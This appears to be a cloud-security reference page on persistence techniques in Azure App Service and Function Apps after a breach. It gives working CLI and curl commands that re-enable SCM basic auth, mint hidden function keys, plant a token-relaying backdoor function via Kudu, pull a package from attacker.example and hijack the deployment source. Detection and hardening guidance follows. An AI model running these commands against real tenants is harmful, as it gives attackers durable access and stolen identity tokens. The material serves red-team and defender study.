---
cstg_id: CSTG-AZURE-APP-SERVICE-FUNCTIONS-PERSIST
title: "AZURE App Service Functions - Persistence"
provider: azure
service: app-service-functions
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Microsoft.Web/sites/write"
  - "Microsoft.Web/sites/config/write"
  - "Microsoft.Web/sites/extensions/write"
  - "Microsoft.Web/sites/functions/write"
  - "Microsoft.Web/sites/host/listkeys/action"
  - "Microsoft.Web/sites/host/functionkeys/write"
  - "Microsoft.Web/sites/publishxml/action"
  - "Microsoft.Web/sites/basicPublishingCredentialsPolicies/write"
  - "Microsoft.Web/sites/sourcecontrols/write"
  - "Microsoft.Web/sites/hybridconnection/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
tools:
  - azure-cli
  - az-rest
  - kudu-api
  - microburst
references:
  - "https://learn.microsoft.com/en-us/azure/app-service/resources-kudu"
  - "https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-http-webhook-trigger"
  - "https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-timer"
  - "https://learn.microsoft.com/en-us/azure/app-service/deploy-run-package"
  - "https://learn.microsoft.com/en-us/azure/app-service/configure-authentication-provider-aad"
  - "https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity"
  - "https://github.com/NetSPI/MicroBurst"
license: CC BY-SA 4.0
---

## Summary

This page covers establishing durable, reusable access to an Azure App Service or Function App after a foothold or escalation. Persistence in this service blends two flavors: **credential persistence** (re-enabling and harvesting SCM basic-auth credentials, minting non-expiring function/host keys) and **code persistence** (planting a backdoor function, web shell, startup hook, deployment-source hijack, or hybrid connection that survives restarts and redeploys). Because most App Service apps carry a managed identity, any persistent code path is also a persistent route to that identity's Entra tokens, making these implants high-impact. The attacker objective is to retain access that survives credential rotation, app restarts, and routine redeployment, while blending into normal deployment activity.

## Prerequisites

- An authenticated principal with `Microsoft.Web/*` write/key actions over the target app, OR existing code/console (Kudu) execution in the app.
- For credential persistence: rights to list/create keys and to toggle `basicPublishingCredentialsPolicies`.
- Azure CLI / `az rest` / `curl` and, for in-app implants, Kudu access (publish credentials or an Entra token for the SCM site).

## Enumeration

```bash
# Current functions, keys, and basic-auth posture (baseline before implanting)
az functionapp function list -g <rg> -n <app> -o table
az functionapp keys list -g <rg> -n <app>
az resource show --ids \
 ".../Microsoft.Web/sites/<app>/basicPublishingCredentialsPolicies/scm" --api-version 2023-12-01
az webapp deployment source show -g <rg> -n <app>
az webapp config appsettings list -g <rg> -n <app> -o table
```

## Misconfigurations & Findings

- SCM/FTP basic-auth credentials enabled (or re-enabled) provide a standing, Entra-independent login.
- Long-lived host/function/master keys that are rarely rotated act as durable API credentials.
- Writable function content, startup commands, or Run-From-Package URLs allow code that re-executes on every restart/scale event.
- Deployment source pointed at an attacker-controllable repo re-plants code on each sync.
- An attached user-assigned managed identity the attacker also controls elsewhere creates a cross-resource persistence bridge.

## Exploitation

### Re-enable and harvest SCM basic-auth credentials

```bash
# Turn basic publishing credentials back on (Microsoft.Web/sites/basicPublishingCredentialsPolicies/write)
az resource update --ids \
 ".../Microsoft.Web/sites/<app>/basicPublishingCredentialsPolicies/scm" \
 --api-version 2023-12-01 --set properties.allow=true

# Recover the standing credentials for repeated Kudu/FTP access
az webapp deployment list-publishing-profiles -g <rg> -n <app> --xml
```

### Mint durable function / host keys

Function and host keys do not expire and are easy to overlook during incident response. Create a named key that looks routine:

```bash
# Create a host-level key (works as x-functions-key on any function)
az functionapp keys set -g <rg> -n <app> --key-type functionKeys \
  --key-name monitoring --key-value <attacker-chosen-value>

# Or a per-function key
az functionapp function keys set -g <rg> -n <app> --function-name <fn> \
  --key-name healthcheck --key-value <attacker-chosen-value>
```

### Plant a backdoor function (HTTP or timer trigger)

Add a new function whose code executes commands or proxies the managed-identity token endpoint. An `anonymous` HTTP trigger is callable without a key; a timer trigger gives scheduled, autonomous execution.

```bash
# Via Kudu VFS, drop a function folder + anonymous HTTP-trigger function.json + code
curl -s -u '<user>:<pass>' -X PUT \
  https://<app>.scm.azurewebsites.net/api/vfs/site/wwwroot/Backdoor/function.json \
  -H 'If-Match: *' --data-binary @function.json
curl -s -u '<user>:<pass>' -X PUT \
  https://<app>.scm.azurewebsites.net/api/vfs/site/wwwroot/Backdoor/index.js \
  -H 'If-Match: *' --data-binary @index.js
```

A minimal backdoor returns a managed-identity token on demand:

```js
// index.js - relays an ARM token for the app's managed identity
module.exports = async function (context, req) {
  const r = await fetch(
    `${process.env.IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01`,
    { headers: { "X-IDENTITY-HEADER": process.env.IDENTITY_HEADER } });
  context.res = { body: await r.text() };
};
```

### Web shell / startup-command implant (App Service)

Drop a web shell into `wwwroot` via Kudu VFS, or set a startup command / Run-From-Package that re-pulls attacker code on every restart:

```bash
# Persisted startup hook (Linux)
az webapp config set -g <rg> -n <app> \
  --startup-file "/home/site/wwwroot/start.sh"   # script fetches+runs payload

# Run-From-Package pointed at an attacker-hosted artifact (re-pulled each start)
az webapp config appsettings set -g <rg> -n <app> \
  --settings WEBSITE_RUN_FROM_PACKAGE="https://attacker.example/payload.zip"
```

### Deployment-source hijack

```bash
# Repoint CI/CD source; attacker code re-deploys on every sync
az webapp deployment source config -g <rg> -n <app> \
  --repo-url https://github.com/attacker/payload --branch main --manual-integration
```

### Hybrid Connection / VNet bridge

Adding a Hybrid Connection or relay binding gives the app (and thus the attacker's in-app code) an outbound bridge into an on-prem or private network that persists with the app configuration.

```bash
az webapp hybrid-connection add -g <rg> -n <app> \
  --namespace <relay-ns> --hybrid-connection <hc>
```

### Identity-based persistence

Attach a user-assigned managed identity that the attacker controls or can re-attach elsewhere, creating a portable token source independent of the app's own credentials:

```bash
az webapp identity assign -g <rg> -n <app> --identities <attacker-controlled-uami-resource-id>
```

### Auth-provider tampering

Where Easy Auth is enabled, adding an attacker-controlled Entra app registration / client secret to the app's auth configuration, or relaxing `unauthenticatedClientAction`, creates a covert authentication backdoor for the front-end.

## Detection & Logging

- **Azure Activity Logs** record the persistence operations: `Microsoft.Web/sites/write`, `.../config/write`, `.../functions/write`, `.../host/functionkeys/write`, `.../host/listkeys/action`, `.../publishxml/action`, `.../sourcecontrols/write`, `.../hybridconnection/write`, `Microsoft.Web/sites/basicPublishingCredentialsPolicies/write` (re-enabling basic auth is a strong signal), and `Microsoft.ManagedIdentity/.../assign/action`.
- **App Service diagnostic logs** (`AppServiceAuditLogs`, `AppServiceConsoleLogs`, `AppServiceFileAuditLogs`, `FunctionAppLogs`, `AppServiceHTTPLogs`) capture Kudu VFS writes (`PUT /api/vfs/...`), `api/command`, new function execution, and SCM logins. File-write audit logs are the key signal for planted functions/web shells.
- **Entra ID sign-in logs** show repeated basic-auth/SCM logins and the managed identity issuing tokens - watch for a backdoor function triggering identity token requests.
- **Microsoft Defender for App Service / for Cloud** raises alerts for web-shell-like files, anomalous Kudu activity, and suspicious deployment/source changes.

## Remediation & Hardening

- Enforce SCM/FTP **basic auth disabled** via Azure Policy so re-enabling is blocked or alerted; require Entra ID for SCM.
- Rotate and inventory host/function/master keys; alert on `host/functionkeys/write` and unexpected new keys; prefer scoped `function` keys over the master key.
- Lock deployment source to trusted repos and disable arbitrary Run-From-Package URLs and untrusted startup commands; pin container images.
- Apply access restrictions/private endpoints to the main and SCM sites; enable file-write and console diagnostic logs.
- Periodically diff `wwwroot` and the function inventory against the expected deployment artifact; treat unexpected functions or files as incidents.
- Review attached user-assigned identities and Easy Auth app registrations/secrets; scope identities least-privilege.
- Alert on the Activity Log operations above, with high priority on basic-auth re-enable, source repointing, and new function/key creation.

## Tools

- **Azure CLI / `az rest`** - key creation, basic-auth toggling, source/startup/identity changes.
- **Kudu API** (`/api/vfs`, `/api/command`) - planting functions, web shells, and reading the implanted state.
- **MicroBurst** - automated key and credential persistence/discovery across apps.

## References

- [Kudu / SCM service](https://learn.microsoft.com/en-us/azure/app-service/resources-kudu)
- [Azure Functions HTTP trigger and authorization](https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-http-webhook-trigger)
- [Azure Functions timer trigger](https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-timer)
- [Run from package](https://learn.microsoft.com/en-us/azure/app-service/deploy-run-package)
- [Configure Entra ID authentication for App Service](https://learn.microsoft.com/en-us/azure/app-service/configure-authentication-provider-aad)
- [Managed identities for App Service and Functions](https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity)
- [NetSPI MicroBurst](https://github.com/NetSPI/MicroBurst)
